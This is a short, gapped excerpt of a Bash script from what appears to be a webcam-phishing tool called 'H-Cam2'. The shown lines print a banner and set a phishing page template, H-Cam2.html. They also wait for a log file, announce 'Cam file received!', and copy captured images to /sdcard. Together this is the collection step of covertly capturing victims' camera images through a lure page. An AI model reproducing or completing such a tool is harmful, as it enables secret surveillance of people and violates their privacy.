...
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]		        Edited by Maruf		      	\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\n"
printf "\n"
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in /sdcard/H-Cam2/images)\e[0m\n"
cd ~/H-Cam2
cp -rf images /sdcard/H-Cam2
rm -rf Log.log
fi
sleep 0.5
...
default_website_template="H-Cam2.html"
